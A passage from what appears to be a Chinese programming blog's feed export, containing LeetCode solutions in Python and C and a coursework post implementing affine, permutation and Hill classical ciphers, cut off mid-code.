class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1lWTWF.png" alt="1lWTWF.png"></p>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这道题目是一个LeetCode难度为困难的题目</p>
<p>但是单看题目会发现很简单，无非可以用到归并排序形成新数组，然后根据新数组长度的奇偶取中位数</p>
<p><strong>但是题目要求的时间复杂度为log(m+n)，而归并排序的时间复杂度为(m+n)，所以这就是这个题目的难点</strong></p>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>使用二分法和递归</p>
<p>首先，我们先解决以下(m+n)的奇偶数问题，即对奇数来说中位数就是数组的第(m+n+1)/2位，而对于偶数来说，中位数就是(m+n)/2位和((m+n)/2)+1位的加和平均。其实可以将奇偶数放在一起考虑，即可以算出<code>int((m+n+1)/2)和int((m+n+2)/2)</code>的加和平均。对奇数和偶数来说都可以适用。</p>
<p>所以只要找到在两个有序数组排序组合后的第int((m+n+1)/2)个值和第int((m+n+2)/2)值就可以。</p>
<p>所以问题就划归为在两个有序数组中找第k值问题。</p>
<p>如果我们一个一个取比较，即归并排序后再去找k值，那么时间复杂度(m+n)，为了使时间复杂度为log(m+n)我们要用到二分法和递归：即我们可以一半一半的排除寻找。</p>
<h2 id="构造getk函数："><a href="#构造getk函数：" class="headerlink" title="构造getk函数："></a>构造getk函数：</h2><p>已知nums1和nums2 ，设nums = nums1 $ nums2</p>
<p>符号$的定义是<code>sorted(nums1+nums2)</code></p>
<p>示意图：</p>
<p>nums1 = [1, 3, 6, 7] </p>
<p>nums2 = [2, 4, 5, 8]</p>
<p>k = 7   k/2 = 3(向下取整)  start1 = 0        start2 = 0</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbtts.png" alt="1lbtts.png"></p>
<p>如图 nums1[3 - 1] &gt; nums2[3 - 1]，则就可以推断2，4，5都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbDnU.png" alt="1lbDnU.png"></p>
<p>k = 7 - 3 = 4    k/2 = 2  start1 = 0 start2 = 3</p>
<p>如图 nums1[2 - 1] &lt; nums2[3 + 2 - 1]，则可以判断1，3都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lvoHf.png" alt="1lvoHf.png"></p>
<p>k = 4 - 2    k/2 = 1    start1 = 2  start2 = 3</p>
<p>如图 nums1[2 + 1 -1] &lt; nums2[3 + 1 -1]，则可以判断6小于nums[7 - 1]，即可以舍去。</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lzJW4.png" alt="1lzJW4.png"></p>
<p>k = 2 -1 start1 = 3 start2 = 3</p>
<p>此时k = 1 即就是在两个数组中没有舍弃的数字中找到最小的数字，比较nums1[3 - 1]和nums2[3 - 1]取最小值就是我们开始要取的getk了</p>
<p>以上就是对一般情况下的求取，现在讨论特殊情况：</p>
<ol>
<li>nums1 || nums2 == none</li>
<li>len(nums1) &lt; k/2 or len(nums2) &lt; k/2</li>
<li>在递归时 k/2 &gt; len(nums1) - start1 or k/2 &gt; len(nums2) - start2</li>
</ol>
<p>其实上述可以用一种特殊情况总结，即</p>
<p><code>start1 &gt;= len(nums1) or start2 &gt;= len(nums2)</code></p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VJMT.png" alt="11VJMT.png"></p>
<p>此时则<code>return nums2[start2 + k -1]</code></p>
<p>这种特殊情况总伴随者下述：</p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VWod.png" alt="11VWod.png"></p>
<p>即剩下的数字不足以二分法，则此时选取最小能舍去的步数，则每次判断可舍去的步数可用如下来求取：</p>
<p><code>half = min(int(n/2),min(len(nums1)-start1,len(nums2)-start2))</code></p>
<p>使用递归来求取k位值，每次可以舍去half个值，则剩下问题就是求取剩下数组们的k-half位值，知道问题缩小到求取的值为1位，则此时就返回<code>return min(nums1[start1-1],nums2[start2-1])</code></p>
<p>其中start1和start2是变化的，即如果在上次舍去nums1数组half个值时，start1 = start1 +half，start2同理</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解3</title>
    <url>/2020/01/27/LeetCode%E9%A2%98%E8%A7%A33/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第3题，无重复字符的最长字串</strong></p>
<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: “abcabcbb”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。</p>
<p>示例 2:</p>
<p>输入: “bbbbb”<br>输出: 1<br>解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。</p>
<p>示例 3:</p>
<p>输入: “pwwkew”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。<br>请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        sw = []</span><br><span class="line">        l = []</span><br><span class="line">        m = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> sw:</span><br><span class="line">                l.append(len(sw))</span><br><span class="line">                <span class="keyword">while</span> sw[<span class="number">0</span>] != i:</span><br><span class="line">                    sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sw.append(i)</span><br><span class="line">        l.append(len(sw))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">            <span class="keyword">if</span> j &gt; m:</span><br><span class="line">                m = j</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uRWHU.png" alt="1uRWHU.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">end</span> &lt; <span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">        <span class="keyword">int</span> c = s[<span class="built_in">end</span>] - <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">while</span>(a[c]&gt;<span class="number">0</span>)&#123; <span class="comment">//表示出现重复元素</span></span><br><span class="line">            a[s[start]-<span class="string">' '</span>]--; <span class="comment">//逐个删除start表示的元素在窗口中的出现</span></span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        a[c]++;</span><br><span class="line">        <span class="built_in">end</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">end</span> - start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">            <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">end</span> -start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">        <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uhG9J.png" alt="1uhG9J.png"></p>
<p><strong>解析：</strong></p>
<ol>
<li><p>原理：</p>
<p>利用滑动窗口的概念，即设置一个窗口空间，用来保存子串</p>
<p>遍历源字符串s，并加到子串中，当新加元素在子串中包含时，源子串固化成为<strong>没有重复字符的子串</strong>(不包括新加重复元素)</p>
<p>从源子串开头删到重复元素(包括重复元素)，变为新子串的前缀，并将新加元素添加到末尾</p>
<p>按照上述方式不断获取<strong>没有重复字符的子串</strong></p>
<p>即，窗口的大小在不断变化，其中窗口大小的最大值就是无重复字符的最长字串的长度</p>
</li>
<li><p>实现：</p>
<p><em>python版本</em></p>
<p>利用FIFO的队列思想来实现（利用列表的<code>append()</code>和<code>pop(0)</code>来实现）</p>
<ol>
<li><p>遍历源字符串s，将每个元素加入到队列中</p>
</li>
<li><p>当新加元素队列中重复时，先保存当前队列的大小，并与max比较，数值大者写入到max中，然后队列中队首弹出元素，直到将队列中与新加元素的重复元素弹出，将新加重复元素添加到队尾</p>
</li>
<li><p>遍历结束完源字符串s后，再将此时队列的长度与max比较，返回最大值</p>
</li>
</ol>
</li>
</ol>
<p>   <em>c语言版本</em></p>
<p>   在c语言版本中也用到了滑动窗口的思想，不过具体是用下标来实现的</p>
<ol>
<li><p>用到start和end标记窗口的前后分界</p>
</li>
<li><p>用end来遍历s，当检测出在end处的字符有在窗口中时，记录 end - start 的长度与max取最大值为max，即<code>max = MAX(max, end - start)</code> ，同时移动start到窗口中重复元素之后的一个位置</p>
<p>这里用来检测重复元素用的是数组标记法，即用长度为128(之所以128，是因为元素不只是字母，还有特殊字符)的数组保存每个元素在窗口出现的次数，下标映射关系就是 <code>下标 = s[end] - &#39; &#39;</code></p>
</li>
<li><p>最后返回max即可</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解2</title>
    <url>/2020/01/26/LeetCode%E9%A2%98%E8%A7%A32/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第2题，两数相加</strong></p>
<p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<blockquote>
<p>示例：</p>
<p>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 = 807</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        root = ListNode(<span class="number">0</span>)</span><br><span class="line">        node = root</span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(l1 <span class="keyword">or</span> l2):</span><br><span class="line">            x = l1.val <span class="keyword">if</span> l1 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            y = l2.val <span class="keyword">if</span> l2 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            s = carry + x + y</span><br><span class="line">            carry = s // <span class="number">10</span></span><br><span class="line">            node.next = ListNode(s%<span class="number">10</span>)</span><br><span class="line">            node = node.next</span><br><span class="line">            <span class="keyword">if</span>(l1!=<span class="literal">None</span>):</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span>(l2!=<span class="literal">None</span>):</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        <span class="keyword">if</span>(carry&gt;<span class="number">0</span>):</span><br><span class="line">            node.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> root.next</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2020/01/26/1nKV5q.png" alt="1nKV5q.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">root</span>;</span></span><br><span class="line">        root = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node</span> = <span class="title">root</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (l1 || l2)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (l1)</span><br><span class="line">                x = l1-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (l2)</span><br><span class="line">                y = l2-&gt;val;</span><br><span class="line">            n-&gt;val = (x + y + carry)%<span class="number">10</span>;</span><br><span class="line">            carry = (x + y + carry)/<span class="number">10</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (l1)&#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l1 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2)&#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l2 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            n-&gt;val = <span class="number">1</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/26/1nKn2T.png" alt="1nKn2T.png"></p>
<p><strong>题解：</strong></p>
<p>利用链表构造</p>
<p>首先生成根节点root，并记录下来</p>
<p>逐位相加 L1 和 L2，分三种情况：</p>
<ol>
<li>在该位上，L1 和 L2 都有数值，计算值为 L1 L2 相加并模10取余，加数超过10，则进位carry为1，加入到下一位的计算中</li>
<li>在该位上，L1 有值，L2 为空，则计算值为 L1 的值</li>
<li>在该位上，L2 有值，L1 为空，则计算值为 L2 的值</li>
</ol>
<p>在结束运算时，注意关注carry的值，此时它是 L1 L2 最高位相加的进位值，若为1，则计算值要进一位</p>
<p>最后返回根节点root中的next指针</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2020/01/24/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>(1) 仿射密码  </p>
<p>参数选取：模数n=26+10=36 (26个字母+10个数字)，k2 = 学号后3位 mod n；k1 = 学号后4位 mod n, 若k1与n不互素，则更新k1 = k1+7 或 k1 = k1-7。</p>
<a id="more"></a>

<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">n = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(x,m = n)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> itertools.count(<span class="number">1</span>): </span><br><span class="line">        <span class="comment">#itertools.count(start,step)函数的意思是创建一个从start开始每次的步长是step的无穷序列</span></span><br><span class="line">        <span class="keyword">if</span> (x*y)%m==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> y</span><br><span class="line"> </span><br><span class="line">k1 = int(input(<span class="string">"输入学号后四位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd(n, k1) != <span class="number">1</span>:</span><br><span class="line">    k1 += <span class="number">7</span></span><br><span class="line">    k1 %= n</span><br><span class="line">    print(<span class="string">"k1与n不互素，更新k1:"</span>,k1)</span><br><span class="line">k2 = int(input(<span class="string">"输入学号后三位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (k1*x+k2)%n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (find(k1)*(x-k2))%n</span><br><span class="line"></span><br><span class="line">U = &#123;<span class="string">'0'</span>:<span class="number">0</span>,<span class="string">'1'</span>:<span class="number">1</span>,<span class="string">'2'</span>:<span class="number">2</span>,<span class="string">'3'</span>:<span class="number">3</span>,<span class="string">'4'</span>:<span class="number">4</span>,<span class="string">'5'</span>:<span class="number">5</span>,<span class="string">'6'</span>:<span class="number">6</span>,<span class="string">'7'</span>:<span class="number">7</span>,<span class="string">'8'</span>:<span class="number">8</span>,<span class="string">'9'</span>:<span class="number">9</span>,<span class="string">'a'</span>:<span class="number">10</span>,<span class="string">'b'</span>:<span class="number">11</span>,<span class="string">'c'</span>:<span class="number">12</span>,<span class="string">'d'</span>:<span class="number">13</span>,<span class="string">'e'</span>:<span class="number">14</span>,<span class="string">'f'</span>:<span class="number">15</span>,<span class="string">'g'</span>:<span class="number">16</span>,<span class="string">'h'</span>:<span class="number">17</span>,<span class="string">'i'</span>:<span class="number">18</span>,<span class="string">'j'</span>:<span class="number">19</span>,<span class="string">'k'</span>:<span class="number">20</span>,<span class="string">'l'</span>:<span class="number">21</span>,<span class="string">'m'</span>:<span class="number">22</span>,<span class="string">'n'</span>:<span class="number">23</span>,<span class="string">'o'</span>:<span class="number">24</span>,<span class="string">'p'</span>:<span class="number">25</span>,<span class="string">'q'</span>:<span class="number">26</span>,<span class="string">'r'</span>:<span class="number">27</span>,<span class="string">'s'</span>:<span class="number">28</span>,<span class="string">'t'</span>:<span class="number">29</span>,<span class="string">'u'</span>:<span class="number">30</span>,<span class="string">'v'</span>:<span class="number">31</span>,<span class="string">'w'</span>:<span class="number">32</span>,<span class="string">'x'</span>:<span class="number">33</span>,<span class="string">'y'</span>:<span class="number">34</span>,<span class="string">'z'</span>:<span class="number">35</span>&#125;</span><br><span class="line">V = &#123;<span class="number">0</span>:<span class="string">'0'</span>,<span class="number">1</span>:<span class="string">'1'</span>,<span class="number">2</span>:<span class="string">'2'</span>,<span class="number">3</span>:<span class="string">'3'</span>,<span class="number">4</span>:<span class="string">'4'</span>,<span class="number">5</span>:<span class="string">'5'</span>,<span class="number">6</span>:<span class="string">'6'</span>,<span class="number">7</span>:<span class="string">'7'</span>,<span class="number">8</span>:<span class="string">'8'</span>,<span class="number">9</span>:<span class="string">'9'</span>,<span class="number">10</span>:<span class="string">'a'</span>,<span class="number">11</span>:<span class="string">'b'</span>,<span class="number">12</span>:<span class="string">'c'</span>,<span class="number">13</span>:<span class="string">'d'</span>,<span class="number">14</span>:<span class="string">'e'</span>,<span class="number">15</span>:<span class="string">'f'</span>,<span class="number">16</span>:<span class="string">'g'</span>,<span class="number">17</span>:<span class="string">'h'</span>,<span class="number">18</span>:<span class="string">'i'</span>,<span class="number">19</span>:<span class="string">'j'</span>,<span class="number">20</span>:<span class="string">'k'</span>,<span class="number">21</span>:<span class="string">'l'</span>,<span class="number">22</span>:<span class="string">'m'</span>,<span class="number">23</span>:<span class="string">'n'</span>,<span class="number">24</span>:<span class="string">'o'</span>,<span class="number">25</span>:<span class="string">'p'</span>,<span class="number">26</span>:<span class="string">'q'</span>,<span class="number">27</span>:<span class="string">'r'</span>,<span class="number">28</span>:<span class="string">'s'</span>,<span class="number">29</span>:<span class="string">'t'</span>,<span class="number">30</span>:<span class="string">'u'</span>,<span class="number">31</span>:<span class="string">'v'</span>,<span class="number">32</span>:<span class="string">'w'</span>,<span class="number">33</span>:<span class="string">'x'</span>,<span class="number">34</span>:<span class="string">'y'</span>,<span class="number">35</span>:<span class="string">'z'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">()</span>:</span></span><br><span class="line">    m = input(<span class="string">"输入要加密字符串：\n"</span>)</span><br><span class="line">    c_list = []</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        c_list.append(enc(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c_list:</span><br><span class="line">        c += V[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    c = input(<span class="string">"输入要解密的字符串：\n"</span>)</span><br><span class="line">    m_list = []</span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        m_list.append(dec(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m_list:</span><br><span class="line">        m += V[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    change = input(<span class="string">"1.加密 2.解密:"</span>)</span><br><span class="line">    <span class="keyword">if</span> change == <span class="string">'1'</span>:</span><br><span class="line">        c = encryption()</span><br><span class="line">        print(<span class="string">"密文为:"</span>,c)</span><br><span class="line">    <span class="keyword">elif</span> change == <span class="string">'2'</span>:</span><br><span class="line">        m = decrypt()</span><br><span class="line">        print(<span class="string">"明文为:"</span>,m)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>​    将26个字母和10位数字映射到0-35上</p>
<p>​    加密为 (k1*x+k2)%n</p>
<p>​    解密为 ((k1^-1)*(x-k2))%n</p>
<p>(2) 置换密码</p>
<p>参数选取：分组长度为7；置换关系随机选取；</p>
<p>长度不足时后面全补填充长度。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Group</span><span class="params">(m1,model)</span>:</span></span><br><span class="line">    m1_list = []</span><br><span class="line">    m1_list_new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m1:</span><br><span class="line">        m1_list.append(i)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        rules = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        rules = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rules:</span><br><span class="line">        m1_list_new.append(m1_list[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(m1_list_new)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_or_dec</span><span class="params">()</span>:</span></span><br><span class="line">    model = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        m = input(<span class="string">"输入明文字符串："</span>)</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        m = input(<span class="string">"输入密文字符串："</span>)</span><br><span class="line">    patch = <span class="number">7</span> - len(m)%<span class="number">7</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">7</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span> - len(m)%<span class="number">7</span>):</span><br><span class="line">            m += str(patch)</span><br><span class="line">    m_list= []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        m_list.append(i)</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    m1 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m)/<span class="number">7</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            m1 += m_list[<span class="number">7</span>*i+j]</span><br><span class="line">        c1 = Group(m1,model)</span><br><span class="line">        m1 = <span class="string">''</span></span><br><span class="line">        c += c1</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):    </span><br><span class="line">    k = enc_or_dec()</span><br><span class="line">    print(k)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>正置换：[4,1,0,6,3,5,2]</p>
<p>逆置换：[2,1,6,4,0,5,3]</p>
<p>(3) Hill密码 </p>
<p>参数选取：密钥矩阵和明文/密文的元素均取自 Z26</p>
<p>密钥矩阵为：<img src="https://i.loli.net/2019/12/20/4cajiulRt3BH8eF.png" alt="UTOOLS1576823947931.png"></p>
<p>加解密：若明文为7,8,11,11, 计算密文；若密文为9,8,8,24，计算明文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line">A_list = [[<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>],</span><br><span class="line">          [<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">          [<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>],</span><br><span class="line">          [<span class="number">10</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="comment">#求逆</span></span><br><span class="line">K = 